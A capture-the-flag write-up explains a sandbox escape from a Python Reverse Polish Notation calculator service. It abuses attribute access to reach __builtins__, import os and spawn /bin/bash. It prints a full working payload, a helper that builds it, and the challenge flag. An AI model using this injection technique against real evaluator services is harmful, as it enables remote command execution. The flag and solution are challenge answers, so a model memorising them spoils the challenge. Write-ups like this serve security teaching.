# Rotaluklak (pwn)

A very nice Python exploitation challenge.
We get access to a service and it's [source code](source.py)

The important part of the code is:

```python
    multiply = operator.mul
    divide = operator.div
    idivide = operator.truediv
    add = operator.add
    subtract = operator.sub
    xor = operator.xor
    power = operator.pow
    wumbo = lambda _, x, y: int((str(x) + str(y)) * x)

    def evaluate(self, expr, debug=False):
        expr = expr.split()
        stack = []
        for token in expr:
            try:
                # If the token is a number, push it onto the stack.
                stack.append(int(token))
            except ValueError:
                # This is an operator call the appropriate function
                y = stack.pop()
                x = stack.pop()
                stack.append(operator.attrgetter(token)(self)(x, y))
        return stack[0]
```

The service takes our input, splits tokens by space and then evaluates them as Reverse Polish Notation inputs.
It seems we can only pass integer arguments and call only 2-argument functions from `self`.

There are a couple of important points here:

1. Due to how `operator.attrgetter` works we can access properties recursively here - we can pass `x.y.z` to access `self.x.y.z`
2. We can access ANY property of the `self` object, not only functions we can see in the source code.
3. While arguments we pass directly in input can be only integers, we can place any object on the stack, as long as this object is returned from function we call

As usual in such challenges we try to figure out how to get access to `__builtins__` module and then use `__import__` to get something like `os` or `subprocess`.
There is not much to work with, but there is `wumbo` lambda function, which contains `func_globals` dictionary.
In this dictionary we have `__builtins__` module we want.
The problem is we can't use `['__builtins__']` in `operator.attrgetter` parameter, we can only access direct properties.

Our idea is to call `wumbo.func_globals.get` with 2 arguments `__builtins__` and some random integer, which will return the module we want.
Now to do this we need to have a string on the stack, so we can use it as an argument.

We will need more strings, so it's a good idea to make a function which can create arbitrary strings on the stack.
To achieve this we will use `__doc__.__getslice__`.
It's quite obvious the intended way, because `__doc__` contains all possible characters.
We use `__getslice__` for simplicity, as it actually takes 2 arguments.

So to get some letters on the stack we can just use payload `x y __getslice__` and the evaluator will place `__doc__[x:y]` on the stack.
Of course there are no whole words we need in the docstring, so we'll have to combine those from single letters.
In order to combine them we can just use `add` function.
So if we do:

`x y __getslice__ z v __getslice__ add`

We will get word `__doc__[x:y]+__doc__[z:v]` on the stack.
The final function is just:


```python
def string_generator(payload):
    result = []
    c = Calculator()
    data = c.__doc__
    for character in payload:
        index = data.index(character)
        result.append((str(index), str(index + 1), "__doc__.__getslice__"))
    result.append(('add',) * (len(payload) - 1))
    return " ".join([" ".join([y for y in x]) for x in result])
```

Now back to our initial problem - we want to get `__builtins__` module.
Since we can genrate strings now, we can just send payload `string_generator("__builtins__")+' 1 wumbo.func_globals.get'` and voila, we get module on the stack.

Now the problem is, how can we use this?
Again, the function to call or properties to extract can come only from `self`.
Fortunately python allows to monkey-patch anything, so we can just create a new property on object `self` using `self.__setattr__` function.
This functions requires 2 arguments - name of the property and value.

So we can chain this with our previous payload to get:

```python
string_generator("b")+' '+string_generator("__builtins__")+' 1 wumbo.func_globals.get  __setattr__ '
```

And this will create a new property `b` on object `self` and assign the `__builtins__` module there. 
Downside of this, is that setattr pushes None on the stack, and from now on we won't get echo, since top of the stack will be None.
Property is there, we can do `b.__import__` to access import function.

We can call this function on some module we want, for example `os` to get this module on the stack again.

```python
string_generator("b")+' '+string_generator("__builtins__")+' 1 wumbo.func_globals.get __setattr__ '+string_generator("os")+' 1 b.__import__')
```

Again we need to assign this module to some property in order to be able to access it, so we do:

```python
string_generator("b")+' '+string_generator("__builtins__")+' 1 wumbo.func_globals.get  __setattr__ '+string_generator("s")+ ' '+string_generator("os")+' 1 b.__import__ __setattr__')
```

And voila, we have `os` module set as `self.s` property.

We want to call `os.execl("/bin/bash","x")`, so what we do is simply place two strings as arguments on the stack and then call the function:

```python
string_generator("b")+' '+string_generator("__builtins__")+' 1 wumbo.func_globals.get  __setattr__ '+string_generator("s")+ ' '+string_generator("os")+' 1 b.__import__ __setattr__ '+ string_generator("/bin/bash") + ' ' + string_generator("x") + ' s.execl'
```

This gives us the final payload of:

```
358 359 __doc__.__getslice__  1772 1773 __doc__.__getslice__ 1772 1773 __doc__.__getslice__ 358 359 __doc__.__getslice__ 93 94 __doc__.__getslice__ 81 82 __doc__.__getslice__ 91 92 __doc__.__getslice__ 96 97 __doc__.__getslice__ 81 82 __doc__.__getslice__ 120 121 __doc__.__getslice__ 82 83 __doc__.__getslice__ 1772 1773 __doc__.__getslice__ 1772 1773 __doc__.__getslice__ add add add add add add add add add add add 1 wumbo.func_globals.get  __setattr__ 82 83 __doc__.__getslice__  97 98 __doc__.__getslice__ 82 83 __doc__.__getslice__ add 1 b.__import__ __setattr__ 1787 1788 __doc__.__getslice__ 358 359 __doc__.__getslice__ 81 82 __doc__.__getslice__ 120 121 __doc__.__getslice__ 1787 1788 __doc__.__getslice__ 358 359 __doc__.__getslice__ 87 88 __doc__.__getslice__ 82 83 __doc__.__getslice__ 80 81 __doc__.__getslice__ add add add add add add add add 112 113 __doc__.__getslice__  s.execl
```

Whe we send this payload to the server, we will invoke `os.execl("/bin/bash","x")` and therefore gain shell.
We can just cat the flag there: `Flag:r3vers3_p0lish_eXpl01tS!`

Initially we wanted to use `subprocess.check_output()` instead of `os.execl()`, but as mentioned earlier `setattr` places None on the stack, and therefore the result of the command is not on the top, and we can't see it.
It was easier to use `os.execl()` than to figure out how to pop those Nones, or how to start a reverse shell on the target machine.
